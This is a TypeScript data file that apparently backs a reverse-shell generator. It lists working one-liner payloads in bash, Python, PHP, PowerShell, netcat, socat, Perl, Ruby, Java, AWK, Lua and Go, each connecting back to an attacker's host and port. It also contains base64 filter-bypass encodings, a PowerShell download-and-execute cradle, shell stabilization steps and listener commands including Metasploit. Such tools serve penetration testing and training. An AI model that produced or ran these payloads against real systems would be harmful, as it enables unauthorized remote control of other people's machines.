export type Category = 'bash' | 'python' | 'php' | 'powershell' | 'perl' | 'ruby' | 'java' | 'netcat' | 'socat' | 'other';

export interface ShellEntry {
    id: string;
    label: string;
    category: Category;
    description: string;
    cmd: (lhost: string, port: string) => string;
    encode?: boolean; // hint: URL-encode when injecting via web
    windows?: boolean;
    linux?: boolean;
}

export interface StabilizeStep {
    title: string;
    cmd: string;
    note: string;
}

export interface ListenerEntry {
    label: string;
    cmd: (port: string) => string;
}

// ─── Shell Definitions ────────────────────────────────────────────
export const SHELLS: ShellEntry[] = [
    // ── Bash ──────────────────────────────────────────────────────
    {
        id: 'bash-tcp',
        label: 'Bash TCP',
        category: 'bash',
        description: 'Classic bash redirect over TCP — most reliable on Linux targets.',
        linux: true,
        cmd: (l, p) => `bash -i >& /dev/tcp/${l}/${p} 0>&1`,
    },
    {
        id: 'bash-tcp-196',
        label: 'Bash TCP (fd 196)',
        category: 'bash',
        description: 'Uses explicit file descriptor — works around some shell restrictions.',
        linux: true,
        cmd: (l, p) => `0<&196;exec 196<>/dev/tcp/${l}/${p}; sh <&196 >&196 2>&196`,
    },
    {
        id: 'bash-udp',
        label: 'Bash UDP',
        category: 'bash',
        description: 'UDP variant — useful when TCP egress is filtered.',
        linux: true,
        cmd: (l, p) => `sh -i >& /dev/udp/${l}/${p} 0>&1`,
    },
    {
        id: 'bash-b64',
        label: 'Bash Base64',
        category: 'bash',
        description: 'Base64-encoded payload — bypasses simple string filters.',
        linux: true,
        cmd: (l, p) => {
            const inner = `bash -i >& /dev/tcp/${l}/${p} 0>&1`;
            const bytes = new TextEncoder().encode(inner);
            const b64 = btoa(Array.from(bytes, b => String.fromCharCode(b)).join(''));
            return `echo ${b64} | base64 -d | bash`;
        },
    },

    // ── Python ────────────────────────────────────────────────────
    {
        id: 'python3-socket',
        label: 'Python3 Socket',
        category: 'python',
        description: 'Pure socket — no subprocess dependency.',
        linux: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${l}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    },
    {
        id: 'python3-subprocess',
        label: 'Python3 Subprocess',
        category: 'python',
        description: 'Uses subprocess — works when pty module is unavailable.',
        linux: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${l}",${p}));subprocess.call(["/bin/sh"],stdin=s,stdout=s,stderr=s)'`,
    },
    {
        id: 'python2-socket',
        label: 'Python2 Socket',
        category: 'python',
        description: 'Python 2 variant — for older targets.',
        linux: true,
        cmd: (l, p) =>
            `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${l}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`,
    },
    {
        id: 'python-windows',
        label: 'Python3 Windows',
        category: 'python',
        description: 'cmd.exe shell for Windows targets via Python.',
        windows: true,
        cmd: (l, p) =>
            `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("${l}",${p}));subprocess.call(["cmd.exe"],stdin=s,stdout=s,stderr=s)'`,
    },

    // ── PHP ───────────────────────────────────────────────────────
    {
        id: 'php-exec',
        label: 'PHP exec()',
        category: 'php',
        description: 'One-liner via exec — inject into eval or webshell.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-shell-exec',
        label: 'PHP shell_exec()',
        category: 'php',
        description: 'Uses shell_exec — alternative when exec is disabled.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-passthru',
        label: 'PHP passthru()',
        category: 'php',
        description: 'passthru variant — useful when other functions are blacklisted.',
        linux: true,
        encode: true,
        cmd: (l, p) =>
            `php -r '$sock=fsockopen("${l}",${p});passthru("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
        id: 'php-pentestmonkey',
        label: 'PHP PentestMonkey',
        category: 'php',
        description: 'Classic reverse shell script — upload and browse to trigger.',
        linux: true,
        cmd: (l, p) =>
            `# Download the shell:\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n\n# Edit LHOST / LPORT:\nsed -i "s/127.0.0.1/${l}/g; s/1234/${p}/g" php-reverse-shell.php`,
    },

    // ── PowerShell ────────────────────────────────────────────────
    {
        id: 'ps-tcp',
        label: 'PowerShell TCP',
        category: 'powershell',
        description: 'Pure PowerShell TCP — no binaries needed.',
        windows: true,
        cmd: (l, p) =>
            `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${l}",${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    },
    {
        id: 'ps-b64',
        label: 'PowerShell B64',
        category: 'powershell',
        description: 'Base64-encoded PowerShell — avoids quote escaping issues.',
        windows: true,
        cmd: (l, p) => {
            const inner = `$client = New-Object System.Net.Sockets.TCPClient('${l}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;

            const bytes = new Uint8Array(inner.length * 2);
            for (let i = 0; i < inner.length; i++) {
                const code = inner.charCodeAt(i);
                bytes[i * 2] = code & 0xff;
                bytes[i * 2 + 1] = code >> 8;
            }
            const b64 = btoa(Array.from(bytes, b => String.fromCharCode(b)).join(''));

            return `powershell -EncodedCommand ${b64}`;
        },
    },
    {
        id: 'ps-nishang',
        label: 'Nishang Invoke-PowerShellTcp',
        category: 'powershell',
        description: 'Downloads and executes Nishang shell in memory.',
        windows: true,
        cmd: (l, p) =>
            `# On your machine — serve the file:\npython3 -m http.server 80\n\n# On target:\npowershell IEX(New-Object Net.WebClient).DownloadString('http://${l}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${l} -Port ${p}`,
    },

    // ── Netcat ────────────────────────────────────────────────────
    {
        id: 'nc-traditional',
        label: 'Netcat (traditional)',
        category: 'netcat',
        description: 'Traditional netcat with -e — older versions only.',
        linux: true,
        cmd: (l, p) => `nc -e /bin/sh ${l} ${p}`,
    },
    {
        id: 'nc-openbsd',
        label: 'Netcat (OpenBSD)',
        category: 'netcat',
        description: 'OpenBSD netcat without -e — uses named pipe trick.',
        linux: true,
        cmd: (l, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${l} ${p} >/tmp/f`,
    },
    {
        id: 'nc-windows',
        label: 'Netcat Windows',
        category: 'netcat',
        description: 'netcat for Windows — requires nc.exe on target.',
        windows: true,
        cmd: (l, p) => `nc.exe -e cmd.exe ${l} ${p}`,
    },
    {
        id: 'ncat',
        label: 'Ncat (nmap)',
        category: 'netcat',
        description: 'Ncat from nmap suite — supports SSL.',
        linux: true,
        cmd: (l, p) => `ncat ${l} ${p} -e /bin/bash`,
    },

    // ── Socat ─────────────────────────────────────────────────────
    {
        id: 'socat-basic',
        label: 'Socat Basic',
        category: 'socat',
        description: 'Simple socat shell.',
        linux: true,
        cmd: (l, p) => `socat TCP:${l}:${p} EXEC:/bin/sh`,
    },
    {
        id: 'socat-pty',
        label: 'Socat PTY (fully interactive)',
        category: 'socat',
        description: 'Fully interactive PTY — best for stable shell. Requires socat on listener too.',
        linux: true,
        cmd: (l, p) => `socat TCP:${l}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    },
    {
        id: 'socat-listener',
        label: 'Socat Listener (your machine)',
        category: 'socat',
        description: 'Listener command to pair with the socat PTY shell above.',
        linux: true,
        cmd: (_l, p) => `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${p}`,
    },

    // ── Perl ──────────────────────────────────────────────────────
    {
        id: 'perl-socket',
        label: 'Perl Socket',
        category: 'perl',
        description: 'Pure Perl socket shell — common on older Linux systems.',
        linux: true,
        cmd: (l, p) =>
            `perl -e 'use Socket;$i="${l}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },

    // ── Ruby ──────────────────────────────────────────────────────
    {
        id: 'ruby-socket',
        label: 'Ruby Socket',
        category: 'ruby',
        description: 'Ruby one-liner — works on both Linux and macOS.',
        linux: true,
        cmd: (l, p) =>
            `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${l}","${p}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    },

    // ── Java ──────────────────────────────────────────────────────
    {
        id: 'java-runtime',
        label: 'Java Runtime.exec()',
        category: 'java',
        description: 'Java runtime execution — useful in RCE on Java apps (Struts, Log4Shell, etc.).',
        linux: true,
        cmd: (l, p) =>
            `r = Runtime.getRuntime();\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${l}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);\np.waitFor()`,
    },

    // ── Other ─────────────────────────────────────────────────────
    {
        id: 'awk',
        label: 'AWK',
        category: 'other',
        description: 'AWK one-liner — surprisingly common on minimal Linux installs.',
        linux: true,
        cmd: (l, p) =>
            `awk 'BEGIN {s = "/inet/tcp/0/${l}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/stdin`,
    },
    {
        id: 'lua',
        label: 'Lua',
        category: 'other',
        description: 'Lua socket shell — found on embedded systems, game servers.',
        linux: true,
        cmd: (l, p) =>
            `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${l}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    },
    {
        id: 'golang',
        label: 'Go (compile on target)',
        category: 'other',
        description: 'Go source — compile and run on target if Go is available.',
        linux: true,
        cmd: (l, p) =>
            `# Save as shell.go and compile:\ncat > /tmp/shell.go << 'EOF'\npackage main\nimport ("net";"os";"os/exec")\nfunc main() {\n  c, _ := net.Dial("tcp", "${l}:${p}")\n  cmd := exec.Command("/bin/sh")\n  cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c\n  cmd.Run()\n}\nEOF\ngo run /tmp/shell.go`,
    },
];

// ─── Stabilization Techniques ─────────────────────────────────────
export const STABILIZE_STEPS: StabilizeStep[] = [
    {
        title: 'Python PTY spawn',
        cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'`,
        note: 'Run on target — spawns a proper PTY',
    },
    {
        title: 'Background & stty raw',
        cmd: `# Ctrl+Z  →  background the shell\nstty raw -echo; fg`,
        note: 'Run on YOUR machine — enables raw mode',
    },
    {
        title: 'Fix terminal size',
        cmd: `# On your machine first:\nstty size\n\n# Then on target:\nstty rows <rows> cols <cols>\nexport TERM=xterm`,
        note: 'Fixes arrow keys, tab completion, Ctrl+C',
    },
    {
        title: 'rlwrap listener (easy mode)',
        cmd: `rlwrap nc -lvnp <port>`,
        note: 'Wrap netcat with readline — instant history & arrows',
    },
];

// ─── Listener Commands ────────────────────────────────────────────
export const LISTENERS: ListenerEntry[] = [
    { label: 'Netcat', cmd: (p: string) => `nc -lvnp ${p}` },
    { label: 'Ncat', cmd: (p: string) => `ncat -lvnp ${p}` },
    { label: 'Socat PTY', cmd: (p: string) => `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:${p},reuseaddr` },
    { label: 'rlwrap nc', cmd: (p: string) => `rlwrap nc -lvnp ${p}` },
    { label: 'Metasploit', cmd: (p: string) => `msfconsole -q -x "use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LPORT ${p}; run"` },
];

export const CATEGORIES: { id: Category; label: string }[] = [
    { id: 'bash', label: 'Bash' },
    { id: 'python', label: 'Python' },
    { id: 'php', label: 'PHP' },
    { id: 'powershell', label: 'PowerShell' },
    { id: 'netcat', label: 'Netcat' },
    { id: 'socat', label: 'Socat' },
    { id: 'perl', label: 'Perl' },
    { id: 'ruby', label: 'Ruby' },
    { id: 'java', label: 'Java' },
    { id: 'other', label: 'Other' },
];
